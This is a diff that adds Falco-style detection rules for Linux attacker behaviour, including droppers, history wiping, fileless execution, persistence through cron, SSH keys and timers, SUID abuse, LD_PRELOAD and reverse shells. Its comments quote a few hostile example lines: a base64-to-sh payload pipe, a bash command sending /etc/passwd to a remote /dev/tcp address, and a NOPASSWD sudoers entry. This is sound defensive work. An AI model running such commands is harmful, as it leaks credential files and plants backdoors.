@@ -1,0 +1,410 @@
+# ==============================================================================
+# RULE: EXECUTION FROM TEMPORARY FILESYSTEMS (Droppers)
+# ==============================================================================
+# Detects when a binary is executed from /tmp or /dev/shm.
+# Attackers often download droppers or crypto-miners here because:
+# 1. They are globally writable.
+# 2. Security teams often forget to mount them as 'noexec'.
+- rule: Execution from /tmp or /dev/shm
+  desc: Detects execution of binaries from temporary directories, a common dropper behavior.
+  condition: >
+    spawned_process and 
+    (
+      proc.exepath startswith "/tmp/" or 
+      proc.exepath startswith "/dev/shm/" or
+      proc.cwd startswith "/tmp/" or 
+      proc.cwd startswith "/dev/shm/"
+    )
+    and not proc.name in ("runc", "docker", "podman", "containerd")
+  output: >
+    Suspicious binary execution from temporary storage 
+    (file=%proc.exepath cmd=%proc.cmdline user=%user.name container=%container.name)
+  priority: WARNING
+  tags: [mitre_execution, droppers]
+
+# ==============================================================================
+# RULE: SHELL HISTORY TAMPERING (Defense Evasion)
+# ==============================================================================
+# Detects when a user tries to hide their tracks by modifying history files.
+# Covers deletion (unlink), truncation (open_write), and hiding (rename).
+# Targets .bash_history, .zsh_history, etc.
+- rule: Shell History Tampering
+  desc: Detects attempts to delete, truncate, or symlink shell history files.
+  condition: >
+    (open_write or evt.type in (unlink, unlinkat, rename, renameat)) and 
+    fd.name endswith "history" and 
+    (fd.name contains ".bash_" or fd.name contains ".zsh_" or fd.name contains ".sh_")
+  output: >
+    Shell history tampered with (action=%evt.type file=%fd.name user=%user.name)
+  priority: WARNING
+  tags: [mitre_defense_evasion, logging]
+
+# ==============================================================================
+# RULE: FILELESS EXECUTION (memfd_create)
+# ==============================================================================
+# Detects the 'memfd_create' syscall.
+# Uses 'proc.exepath' for system binaries (Safe).
+# Uses 'proc.cmdline' for specific Python scripts (Safe, avoids whitelisting all 'python').
+- rule: Fileless Execution via memfd_create
+  desc: >
+    Detects the creation of memory-only files (memfd), a technique often used for 
+    fileless malware execution or code injection.
+  condition: >
+    evt.type = memfd_create and 
+    not (
+      (
+        proc.exepath in (
+          "/usr/lib/systemd/systemd",
+          "/usr/lib/systemd/systemd-executor",
+          "/usr/lib/systemd/systemd-journald",
+          "/usr/libexec/cockpit-tls",
+          "/usr/sbin/setroubleshootd",
+          "/opt/google/chrome/chrome",
+          "/opt/brave.com/brave/brave",
+          "/usr/bin/pipewire",
+          "/usr/bin/pipewire-pulse",
+          "/usr/bin/dbus-broker-launch"
+        )
+      ) 
+      or 
+      (
+        proc.name = "SetroubleshootP" and 
+        proc.cmdline contains "setroubleshoot"
+      )
+      or 
+      (
+        proc.name = "setroubleshootd" and
+        proc.cmdline contains "/usr/sbin/setroubleshootd"
+      )
+    )
+  output: >
+    Fileless execution attempt via memfd_create 
+    (process=%proc.name exepath=%proc.exepath command=%proc.cmdline)
+  priority: WARNING
+  tags: [mitre_execution, fileless_malware]
+
+# ==============================================================================
+# RULE: KERNEL MODULE MODIFICATION (PrivEsc / Rootkits)
+# ==============================================================================
+# Detects attempts to load or unload kernel modules.
+# In containerized environments, the kernel is shared with the host.
+# A container trying to load a module (e.g., a rootkit or hardware driver)
+# is a severe security violation indicating a container breakout attempt.
+- rule: Kernel Module Modification Attempt
+  desc: Detects attempts to insert (insmod) or remove (rmmod) kernel modules.
+  condition: >
+    spawned_process and 
+    proc.name in (insmod, modprobe, rmmod, lsmod) and 
+    not user.name = "root"
+  output: >
+    Kernel module modification attempted (tool=%proc.name user=%user.name cmd=%proc.cmdline)
+  priority: CRITICAL
+  tags: [ mitre_privilege_escalation, persistence ]
+
+# ==============================================================================
+# RULE: SUDOERS FILE MODIFICATION (Persistence/PrivEsc)
+# ==============================================================================
+# Detects writing to /etc/sudoers or the /etc/sudoers.d directory.
+# Attackers modify these files to grant themselves password-less sudo rights
+# (e.g. "ALL=(ALL) NOPASSWD: ALL") to maintain persistence.
+- rule: Sudoers Modification
+  desc: Detects attempts to write to sudoers configuration files.
+  condition: >
+    open_write and 
+    (fd.name = "/etc/sudoers" or fd.name startswith "/etc/sudoers.d/")
+  output: >
+    Sudoers file opened for writing (file=%fd.name process=%proc.name user=%user.name)
+  priority: CRITICAL
+  tags: [mitre_privilege_escalation, persistence]
+
+# ==============================================================================
+# RULE: NETWORK RECONNAISSANCE TOOLS (Discovery)
+# ==============================================================================
+# Detects the execution of known network scanning and mapping tools.
+# These tools (nmap, masscan, netcat) are rarely used in production
+# application containers but are the first tools an attacker uses to map the network.
+- rule: Network Reconnaissance Tools
+  desc: Detects the launch of network scanning tools.
+  condition: >
+    spawned_process and 
+    proc.name in (nmap, masscan, ncat, netcat, nc, socat, tcpdump, tshark)
+  output: >
+    Network reconnaissance tool launched (tool=%proc.name cmd=%proc.cmdline user=%user.name)
+  priority: NOTICE
+  tags: [mitre_discovery, mitre_lateral_movement]
+
+# ==============================================================================
+# RULE: OBFUSCATED COMMAND EXECUTION (Base64)
+# ==============================================================================
+# Detects commands being piped into base64 decoding.
+# Attackers often encode their payloads (e.g., `echo "bWFsaWNpb3VzCg==" | base64 -d | sh`)
+# to bypass keyword detection filters (like WAFs or simple grep).
+- rule: Obfuscated Base64 Execution
+  desc: Detects shell commands using base64 decoding, often used to hide payloads.
+  condition: >
+    spawned_process and 
+    (proc.cmdline contains "base64" and (proc.cmdline contains "-d" or proc.cmdline contains "--decode"))
+  output: >
+    Obfuscated base64 command execution (cmd=%proc.cmdline user=%user.name)
+  priority: WARNING
+  tags: [mitre_defense_evasion, obfuscation]
+
+# ==============================================================================
+# RULE: LOCAL ACCOUNT MANIPULATION
+# ==============================================================================
+# Detects the creation or deletion of user accounts.
+# Attackers may create a "backdoor" user (e.g., 'service-admin') to
+# blend in and log in legitimately later.
+- rule: User Account Manipulation
+  desc: Detects execution of user/group management commands.
+  condition: >
+    spawned_process and 
+    proc.name in (useradd, userdel, usermod, groupadd, groupdel, adduser, deluser)
+  output: >
+    User account manipulation detected (tool=%proc.name cmd=%proc.cmdline user=%user.name)
+  priority: NOTICE
+  tags: [mitre_persistence, create_account]
+
+# ==============================================================================
+# RULE: PERSISTENCE VIA SSH KEYS
+# ==============================================================================
+# Detects writing to 'authorized_keys'.
+# A common post-exploitation step is injecting the attacker's public key
+# into a user's .ssh directory to bypass password requirements later.
+- rule: SSH Key Injection (authorized_keys)
+  desc: Detects attempts to write to authorized_keys files.
+  condition: >
+    open_write and 
+    fd.name endswith "/authorized_keys" and 
+    not proc.name in (sshd)
+  output: >
+    SSH authorized_keys modified (file=%fd.name process=%proc.name user=%user.name)
+  priority: CRITICAL
+  tags: [mitre_persistence, ssh_keys]
+
+
+# ==============================================================================
+# RULE: PERSISTENCE VIA CRON JOB
+# ==============================================================================
+# Detects modifications to cron directories or files.
+# Attackers often add a scheduled task to re-execute their reverse shell
+# every hour/day to maintain access even if the process is killed.
+- rule: Persistence via Cron Modification
+  desc: Detects attempts to write to cron scheduling directories.
+  condition: >
+    open_write and 
+    (
+      fd.name startswith "/etc/cron" or 
+      fd.name startswith "/var/spool/cron/" or 
+      fd.name = "/etc/crontab"
+    ) and not proc.name in (crond, anacron)
+  output: >
+    Cron configuration modified (file=%fd.name process=%proc.name user=%user.name)
+  priority: WARNING
+  tags: [mitre_persistence, scheduled_task]
+
+# ==============================================================================
+# RULE: eBPF PROGRAM LOADING (Syscall)
+# ==============================================================================
+# Detects the 'bpf' syscall with the BPF_PROG_LOAD command (5).
+# This captures any process trying to inject code into the kernel.
+- rule: eBPF Program Loading (bpf syscall)
+  desc: Detects attempts to load eBPF programs into the kernel.
+  condition: >
+    evt.type = bpf and 
+    (evt.arg.cmd = "BPF_PROG_LOAD" or evt.arg.cmd = 5) and 
+    not proc.name in (falco, falco-bpf, systemd, systemd-journal, kube-proxy, cilium-agent, calico-node)
+  output: >
+    eBPF program loaded into kernel (cmd=%evt.arg.cmd process=%proc.name user=%user.name container=%container.name)
+  priority: WARNING
+  tags: [mitre_persistence, mitre_defense_evasion, rootkit, ebpf]
+
+# ==============================================================================
+# RULE: eBPF MANAGEMENT TOOL EXECUTION
+# ==============================================================================
+# Detects execution of 'bpftool', which is used to inspect or manage
+# BPF programs and maps. Attackers use this to list existing hooks or load new ones.
+- rule: eBPF Management Tool Execution
+  desc: Detects execution of bpftool.
+  condition: >
+    spawned_process and 
+    (proc.name = "bpftool" or proc.exepath endswith "/bpftool")
+  output: >
+    eBPF management tool executed (user=%user.name command=%proc.cmdline)
+  priority: NOTICE
+  tags: [mitre_discovery, ebpf]
+
+# ==============================================================================
+# RULE: BASH /DEV/TCP SIGNATURE (Command Line)
+# ==============================================================================
+# Detects the explicit use of the /dev/tcp or /dev/udp syntax in arguments.
+# Example: bash -c 'cat /etc/passwd > /dev/tcp/1.2.3.4/80'
+- rule: Bash /dev/tcp Backdoor (Signature)
+  desc: Detects usage of bash's built-in /dev/tcp or /dev/udp for networking.
+  condition: >
+    spawned_process and 
+    (
+      proc.cmdline contains "/dev/tcp/" or 
+      proc.cmdline contains "/dev/udp/"
+    )
+  output: >
+    Bash /dev/tcp network traffic syntax detected 
+    (cmd=%proc.cmdline user=%user.name container=%container.name)
+  priority: CRITICAL
+  tags: [mitre_command_and_control, reverse_shell]
+
+# ==============================================================================
+# RULE: BASH OUTBOUND CONNECTION (Behavioral)
+# ==============================================================================
+# Detects when bash (or other shells) initiates a network connection.
+# This catches /dev/tcp usage even if the command line is obfuscated or
+# typed interactively, as the underlying syscall is still a 'connect'.
+- rule: Shell Outbound Connection (Potential Backdoor)
+  desc: Detects a shell process initiating an outbound network connection.
+  condition: >
+    outbound and 
+    proc.name in (bash, sh, zsh, ksh, dash, ash) and 
+    not (fd.sip in (127.0.0.1, ::1))
+  output: >
+    Shell initiated outbound network connection (likely /dev/tcp or reverse shell) 
+    (shell=%proc.name target=%fd.sip:%fd.sport cmd=%proc.cmdline)
+  priority: WARNING
+  tags: [mitre_command_and_control, reverse_shell]
+
+# ==============================================================================
+# RULE: SUID/SGID BIT SETTING
+# ==============================================================================
+# Detects 'chmod' being used to add SUID (u+s) or SGID (g+s) bits.
+# Updated to exclude Ansible temporary files which generate noise during deployments.
+- rule: SUID/SGID Bit Set via Chmod
+  desc: Detects attempts to set the SUID or SGID bit on a file.
+  condition: >
+    spawned_process and 
+    proc.name = "chmod" and 
+    (proc.cmdline contains "u+s" or proc.cmdline contains "g+s" or proc.cmdline contains "4755") and
+    not proc.cmdline contains "/.ansible/tmp/"
+  output: >
+    SUID/SGID bit set on file (cmd=%proc.cmdline user=%user.name file=%proc.args)
+  priority: CRITICAL
+  tags: [mitre_privilege_escalation, persistence]
+
+# ==============================================================================
+# RULE: SUID BINARY RECONNAISSANCE
+# ==============================================================================
+# Detects 'find' commands scanning for files with permission 4000 (SUID).
+# This is a standard enumeration step for attackers looking for GTFOBins.
+- rule: SUID Binary Reconnaissance
+  desc: Detects attempts to enumerate SUID binaries on the system.
+  condition: >
+    spawned_process and 
+    proc.name = "find" and 
+    (proc.cmdline contains "-perm" and (proc.cmdline contains "4000" or proc.cmdline contains "u=s"))
+  output: >
+    Scanning for SUID binaries detected (cmd=%proc.cmdline user=%user.name)
+  priority: NOTICE
+  tags: [mitre_discovery, enumeration]
+
+# ==============================================================================
+# RULE: DANGEROUS CAPABILITIES ASSIGNMENT
+# ==============================================================================
+# Detects the use of 'setcap' to assign capabilities to files.
+# Attackers use this to give standard binaries (like python or tar)
+# root-level powers without setting the obvious SUID bit.
+- rule: Capabilities Modified (setcap)
+  desc: Detects execution of the setcap utility.
+  condition: >
+    spawned_process and 
+    proc.name = "setcap"
+  output: >
+    File capabilities modified via setcap (cmd=%proc.cmdline user=%user.name)
+  priority: CRITICAL
+  tags: [mitre_privilege_escalation, capabilities]
+
+# ==============================================================================
+# RULE: SHARED LIBRARY INJECTION (LD_PRELOAD)
+# ==============================================================================
+# Detects processes spawned with the LD_PRELOAD environment variable.
+# This is a common method to hook system calls and inject code into running processes.
+- rule: LD_PRELOAD Injection Detected
+  desc: Detects the presence of LD_PRELOAD in process environment variables.
+  condition: >
+    spawned_process and 
+    proc.env contains "LD_PRELOAD=" and 
+    not proc.name in (fakeroot)
+  output: >
+    Process spawned with LD_PRELOAD environment variable 
+    (user=%user.name command=%proc.cmdline env=%proc.env)
+  priority: CRITICAL
+  tags: [mitre_privilege_escalation, mitre_defense_evasion, rootkit]
+
+# ==============================================================================
+# RULE: LOGIN HISTORY ERASURE (utmp/wtmp/btmp)
+# ==============================================================================
+# Detects tampering with binary login records.
+# /var/run/utmp (current logins), /var/log/wtmp (login history), /var/log/btmp (failed logins).
+# Attackers "scrub" these files to remove the record of their SSH session.
+- rule: Login History Erasure
+  desc: Detects modification or deletion of user login history logs.
+  condition: >
+    (open_write or evt.type in (unlink, unlinkat, rename, renameat)) and 
+    (
+      fd.name startswith "/var/run/utmp" or 
+      fd.name startswith "/var/log/wtmp" or 
+      fd.name startswith "/var/log/btmp" or 
+      fd.name startswith "/var/log/lastlog"
+    ) 
+    and not proc.exepath in (
+      "/usr/bin/login",
+      "/usr/sbin/sshd",
+      "/usr/lib/systemd/systemd",
+      "/usr/lib/systemd/systemd-logind",
+      "/usr/libexec/openssh/sshd-session"
+    )
+    and not (
+      proc.exepath = "/usr/bin/sudo" and fd.name = "/var/run/utmp"
+    )
+  output: >
+    Login history log cleared or modified (file=%fd.name process=%proc.name exepath=%proc.exepath user=%user.name)
+  priority: CRITICAL
+  tags: [mitre_defense_evasion, anti_forensics]
+
+# ==============================================================================
+# RULE: SYSTEMD TIMER CREATION (Persistence)
+# ==============================================================================
+# Detects the creation or modification of systemd .timer files.
+# Unlike cron, systemd timers require a file ending in .timer to be placed
+# in system directories like /etc/systemd/system/.
+- rule: Systemd Timer Creation
+  desc: Detects creation or modification of systemd timer units.
+  condition: >
+    (open_write or evt.type in (rename, renameat)) and 
+    fd.name endswith ".timer" and 
+    (
+      fd.name startswith "/etc/systemd/system/" or 
+      fd.name startswith "/usr/lib/systemd/system/" or 
+      fd.name startswith "/run/systemd/system/"
+    ) and 
+    not proc.name in (systemd, dpkg, apt, rpm, dnf, yum)
+  output: >
+    Systemd timer created/modified (persistence attempt) 
+    (file=%fd.name process=%proc.name user=%user.name)
+  priority: CRITICAL
+  tags: [mitre_persistence, scheduled_task, systemd]
+
+# ==============================================================================
+# RULE: SYSTEMD TIMER ACTIVATION
+# ==============================================================================
+# Detects the use of systemctl to start or enable a timer.
+# Exception added for 'is-enabled', which is a read-only status check.
+- rule: Systemd Timer Activated
+  desc: Detects enabling or starting of systemd timers via systemctl.
+  condition: >
+    spawned_process and 
+    proc.name = "systemctl" and 
+    (proc.cmdline contains "enable" or proc.cmdline contains "start") and 
+    proc.cmdline contains ".timer" and
+    not proc.cmdline contains "is-enabled"
+  output: >
+    Systemd timer enabled or started (command=%proc.cmdline user=%user.name)
+  priority: WARNING
+  tags: [mitre_persistence, scheduled_task]
